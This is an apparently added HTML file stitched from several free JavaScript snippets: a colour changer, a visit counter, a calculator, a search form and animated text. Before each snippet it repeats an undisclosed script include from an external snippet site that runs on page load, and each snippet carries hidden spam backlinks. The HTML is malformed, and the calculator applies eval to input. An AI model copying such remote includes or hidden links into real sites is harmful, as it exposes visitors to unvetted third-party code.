@@ -1,0 +1,456 @@
+<html>
+<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
+<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><!-- 
+    Script by http://www.javascriptbestcodes.com --> <form name="changeColor"> 
+    <p><font size="2" face="Verdana,Arial,Helvetica,Sans Serif">Choose 
+    a Background Color: <br> <br> <input type="button" name="colr" 
+    value=" BLUE " onclick="document.bgColor='#0000FF'"> <input 
+    type="button" name="colr" value=" RED " onclick="document.bgColor='#FF0000'"> 
+    <input type="button" name="colr" value=" GREEN " 
+    onclick="document.bgColor='#00FF00'"> <input type="button" 
+    name="colr" value=" WHITE " onclick="document.bgColor='#FFFFFF'"> 
+    <input type="button" name="colr" value=" BLACK " 
+    onclick="document.bgColor='#000000'"></font> </p> </form> 
+    <a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute">javascript code</a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
+<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
+<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><HEAD>
+
+    <SCRIPT LANGUAGE="JavaScript">
+    
+    
+    
+    <!-- Begin
+    function GetCookie (name) {
+    var arg = name + "=";
+    var alen = arg.length;
+    var clen = document.cookie.length;
+    var i = 0;
+    while (i < clen) {
+    var j = i + alen;
+    if (document.cookie.substring(i, j) == arg)
+    return getCookieVal (j);
+    i = document.cookie.indexOf(" ", i) + 1;
+    if (i == 0) break;
+    }
+    return null;
+    }
+    function SetCookie (name, value) {
+    var argv = SetCookie.arguments;
+    var argc = SetCookie.arguments.length;
+    var expires = (argc > 2) ? argv[2] : null;
+    var path = (argc > 3) ? argv[3] : null;
+    var domain = (argc > 4) ? argv[4] : null;
+    var secure = (argc > 5) ? argv[5] : false;
+    document.cookie = name + "=" + escape (value) +
+    ((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
+    ((path == null) ? "" : ("; path=" + path)) +
+    ((domain == null) ? "" : ("; domain=" + domain)) +
+    ((secure == true) ? "; secure" : "");
+    }
+    function DeleteCookie (name) {
+    var exp = new Date();
+    exp.setTime (exp.getTime() - 1);
+    var cval = GetCookie (name);
+    document.cookie = name + "=" + cval + "; expires=" + exp.toGMTString();
+    }
+    var expDays = 30;
+    var exp = new Date();
+    exp.setTime(exp.getTime() + (expDays*24*60*60*1000));
+    function amt(){
+    var count = GetCookie('count')
+    if(count == null) {
+    SetCookie('count','1')
+    return 1
+    }
+    else {
+    var newcount = parseInt(count) + 1;
+    DeleteCookie('count')
+    SetCookie('count',newcount,exp)
+    return count
+       }
+    }
+    function getCookieVal(offset) {
+    var endstr = document.cookie.indexOf (";", offset);
+    if (endstr == -1)
+    endstr = document.cookie.length;
+    return unescape(document.cookie.substring(offset, endstr));
+    }
+    // End -->
+    </SCRIPT>
+    </HEAD>
+    
+    <BODY>
+    <SCRIPT LANGUAGE="JavaScript">
+    <!-- Begin
+    document.write("You've been here <b>" + amt() + "</b> times.")
+    // End -->
+    </SCRIPT>
+    
+    </body>
+    <a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute">javascript code</a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
+<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
+<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><html>
+
+<head>
+
+<style type="text/css">
+<!--
+body {font-family: helvetica}
+p {font-size: 12pt}
+.red {color: red}
+.blue {color: blue}
+-->
+</style>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Begin
+var Memory = 0;
+var Number1 = "";
+var Number2 = "";
+var NewNumber = "blank";
+var opvalue = "";
+
+function Display(displaynumber) {
+document.calculator.answer.value = displaynumber;
+}
+
+function MemoryClear() {
+Memory = 0;
+document.calculator.mem.value = "";
+}
+
+function MemoryRecall(answer) {
+if(NewNumber != "blank") {
+Number2 += answer;
+} else {
+Number1 = answer;
+}
+NewNumber = "blank";
+Display(answer);
+}
+
+function MemorySubtract(answer) {
+Memory = Memory - eval(answer);
+}
+
+function MemoryAdd(answer) {
+Memory = Memory + eval(answer);
+document.calculator.mem.value = " M ";
+NewNumber = "blank";
+}
+
+function ClearCalc() {
+Number1 = "";
+Number2 = "";
+NewNumber = "blank";
+Display("");
+}
+
+function Backspace(answer) {
+answerlength = answer.length;
+answer = answer.substring(0, answerlength - 1);
+if (Number2 != "") {
+Number2 = answer.toString();
+Display(Number2);
+} else {
+Number1 = answer.toString();
+Display(Number1);
+   }
+}
+
+function CECalc() {
+Number2 = "";
+NewNumber = "yes";
+Display("");
+}
+
+function CheckNumber(answer) {
+if(answer == ".") {
+Number = document.calculator.answer.value;
+if(Number.indexOf(".") != -1) {
+answer = "";
+   }
+}
+if(NewNumber == "yes") {
+Number2 += answer;
+Display(Number2);
+}
+else {
+if(NewNumber == "blank") {
+Number1 = answer;
+Number2 = "";
+NewNumber = "no";
+}
+else {
+Number1 += answer;
+}
+Display(Number1);
+   }
+}
+function AddButton(x) {
+if(x == 1) EqualButton();
+if(Number2 != "") {
+Number1 = parseFloat(Number1) + parseFloat(Number2);
+}
+NewNumber = "yes";
+opvalue = '+';
+Display(Number1);
+}
+function SubButton(x) {
+if(x == 1) EqualButton();
+if(Number2 != "") {
+Number1 = parseFloat(Number1) - parseFloat(Number2);
+}
+NewNumber = "yes";
+opvalue = '-';
+Display(Number1);
+}
+function MultButton(x) {
+if(x == 1) EqualButton();
+if(Number2 != "") {
+Number1 = parseFloat(Number1) * parseFloat(Number2);
+}
+NewNumber = "yes";
+opvalue = '*';
+Display(Number1);
+}
+function DivButton(x) {
+if(x == 1) EqualButton();
+if(Number2 != "") {
+Number1 = parseFloat(Number1) / parseFloat(Number2);
+}
+NewNumber = "yes";
+opvalue = '/';
+Display(Number1);
+}
+function SqrtButton() {
+Number1 = Math.sqrt(Number1);
+NewNumber = "blank";
+Display(Number1);
+}
+function PercentButton() {
+if(NewNumber != "blank") {
+Number2 *= .01;
+NewNumber = "blank";
+Display(Number2);
+   }
+}
+function RecipButton() {
+Number1 = 1/Number1;
+NewNumber = "blank";
+Display(Number1);
+}
+function NegateButton() {
+Number1 = parseFloat(-Number1);
+NewNumber = "no";
+Display(Number1);
+}
+function EqualButton() {
+if(opvalue == '+') AddButton(0);
+if(opvalue == '-') SubButton(0);
+if(opvalue == '*') MultButton(0);
+if(opvalue == '/') DivButton(0);
+Number2 = "";
+opvalue = "";
+}
+//  End -->
+</script>
+
+</head>
+
+<body>
+<center>
+<form name="calculator">
+<table bgcolor="#aaaaaa" width=220>
+<tr><td>
+<table bgcolor="#cccccc" border=1>
+<tr><td>
+<table border=0 cellpadding=0>
+<tr><td bgcolor="#000080"><b style="color:white">Calculator</b></td></tr>
+<tr><td>
+<table width="100%" border=0>
+<tr><td colspan=6><input type="text" name="answer" size=30 maxlength=30 onChange="CheckNumber(this.value)"></td></tr>
+<tr><td colspan=6>
+<table border=0 cellpadding=0>
+<tr><td>
+<input type="text" name="mem" size=3 maxlength=3> <input type="button" name="backspace" class="red" value="Backspace" 
+
+onClick="Backspace(document.calculator.answer.value); return false;"> <input type="button" name="CE" class="red" 
+
+value=" CE " onClick="CECalc(); return false;"> <input type="reset" name="C" class="red" value="  C  " 
+
+onClick="ClearCalc(); return false;">
+</td></tr>
+</table>
+</td></tr>
+<tr><td><input type="button" name="MC" class="red" value=" MC " onClick="MemoryClear(); return false;"></td>
+<td><input type="button" name="calc7" class="blue" value="  7  " onClick="CheckNumber('7'); return false;"></td>
+<td><input type="button" name="calc8" class="blue" value="  8  " onClick="CheckNumber('8'); return false;"></td>
+<td><input type="button" name="calc9" class="blue" value="  9  " onClick="CheckNumber('9'); return false;"></td>
+<td><input type="button" name="divide" class="red" value="  /  " onClick="DivButton(1); return false;"></td>
+<td><input type="button" name="sqrt" class="blue" value="sqrt" onClick="SqrtButton(); return false;"></td></tr>
+<tr><td><input type="button" name="MR" class="red" value=" MR " onClick="MemoryRecall(Memory); return false;"></td>
+<td><input type="button" name="calc4" class="blue" value="  4  " onClick="CheckNumber('4'); return false;"></td>
+<td><input type="button" name="calc5" class="blue" value="  5  " onClick="CheckNumber('5'); return false;"></td>
+<td><input type="button" name="calc6" class="blue" value="  6  " onClick="CheckNumber('6'); return false;"></td>
+<td><input type="button" name="multiply" class="red" value="  *  " onClick="MultButton(1); return false;"></td>
+<td><input type="button" name="percent" class="blue" value=" %  " onClick="PercentButton(); return false;"></td></tr>
+<tr><td><input type="button" name="MS" class="red" value=" MS " onClick="MemorySubtract
+
+(document.calculator.answer.value); return false;"></td>
+<td><input type="button" name="calc1" class="blue" value="  1  " onClick="CheckNumber('1'); return false;"></td>
+<td><input type="button" name="calc2" class="blue" value="  2  " onClick="CheckNumber('2'); return false;"></td>
+<td><input type="button" name="calc3" class="blue" value="  3  " onClick="CheckNumber('3'); return false;"></td>
+<td><input type="button" name="minus" class="red" value="  -  " onClick="SubButton(1); return false;"></td>
+<td><input type="button" name="recip" class="blue" value="1/x " onClick="RecipButton(); return false;"></td></tr>
+<tr><td><input type="button" name="Mplus" class="red" value=" M+  " onClick="MemoryAdd
+
+(document.calculator.answer.value); return false;"></td>
+<td><input type="button" name="calc0" class="blue" value="  0  " onClick="CheckNumber('0'); return false;"></td>
+<td><input type="button" name="negate" class="blue" value="+/- " onClick="NegateButton(); return false;"></td>
+<td><input type="button" name="dot" class="blue" value="  .   " onClick="CheckNumber('.'); return false;"></td>
+<td><input type="button" name="plus" class="red" value=" +  " onClick="AddButton(1); return false;"></td>
+<td><input type="button" name="equal" class="red" value="  =   " onClick="EqualButton(); return false;"></td>
+</tr>
+</table>
+</td></tr>
+</table>
+</td></tr>
+</table>
+</td></tr>
+</table>
+</form>
+</center>
+
+</body>
+
+</html><a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute">javascript code</a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
+
+
+
+<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
+<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><html>
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Bing Search Engine</title>
+</head>
+
+<body>
+<table BORDER="0" WIDTH="222" HEIGHT="18">
+  <tr>
+    <td WIDTH="214" HEIGHT="10">
+    <form NAME="search" ID="search" ACTION="http://search.msn.com/results.asp" METHOD="get">
+      <p><font FACE="arial" SIZE="2"><strong>Search
+      <font COLOR="#808080">the Web for:</font></strong></font><br>
+      <input TYPE="text" ID="q" SIZE="18" MAXLENGTH="251" NAME="q" VCARD_NAME="SearchText"><input TYPE="submit" VALUE="Search" NAME="B1"><input TYPE="hidden" NAME="FORM" VALUE="FRNT"><input TYPE="hidden" NAME="un" VALUE="doc"><input TYPE="hidden" NAME="v" VALUE="1"></p>
+    </form>
+    </td>
+  </tr>
+</table>
+<p> </p>
+</body>
+</html>
+
+</body>
+</html>
+<a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute">javascript code</a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
+<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
+<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><head>
+    <base target="_blank">
+    </head>
+    
+    <script language="JavaScript1.2">
+    
+    
+    
+    //configure message
+    message="The Poggers"
+    //animate text in NS6? (0 will turn it off)
+    ns6switch=1
+    
+    var ns6=document.getElementById&&!document.all
+    mes=new Array();
+    mes[0]=-1;
+    mes[1]=-4;
+    mes[2]=-7;mes[3]=-10;
+    mes[4]=-7;
+    mes[5]=-4;
+    mes[6]=-1;
+    num=0;
+    num2=0;
+    txt="";
+    function jump0(){
+    if (ns6&&!ns6switch){
+    jump.innerHTML=message
+    return
+    }
+    if(message.length > 6){
+    for(i=0; i != message.length;i++){
+    txt=txt+"<span style='position:relative;' id='n"+i+"'>"+message.charAt(i)+"</span>"};
+    jump.innerHTML=txt;
+    txt="";
+    jump1a()
+    }
+    else{
+    alert("Your message is to short")
+    }
+    }
+    
+    function jump1a(){
+    nfinal=(document.getElementById)? document.getElementById("n0") : document.all.n0
+    nfinal.style.left=-num2;
+    if(num2 != 9){
+    num2=num2+3;
+    setTimeout("jump1a()",50)
+    }
+    else{
+    jump1b()
+    }
+    }
+    
+    function jump1b(){
+    nfinal.style.left=-num2;
+    if(num2 != 0){num2=num2-3;
+    setTimeout("jump1b()",50)
+    }
+    else{
+    jump2()
+    }
+    }
+    
+    function jump2(){
+    txt="";
+    for(i=0;i != message.length;i++){
+    if(i+num > -1 && i+num < 7){
+    txt=txt+"<span style='position:relative;top:"+mes[i+num]+"'>"+message.charAt(i)+"</span>"
+    }
+    else{txt=txt+"<span>"+message.charAt(i)+"</span>"}
+    }
+    jump.innerHTML=txt;
+    txt="";
+    if(num != (-message.length)){
+    num--;
+    setTimeout("jump2()",50)}
+    else{num=0;
+    setTimeout("jump0()",50)}}
+    </script>
+    </head>
+    <body><center>
+    
+    <h2><div id="jumpx" style="color:blue"></div></h2>
+    <script>
+    if (document.all||document.getElementById){
+    jump=(document.getElementById)? document.getElementById("jumpx") : document.all.jumpx
+    jump0()
+    }
+    else
+    document.write(message)
+    </script>
+    <font face="Tahoma" size="2">  </font>
+    </center>
+    <br />
+    
+
+</html>
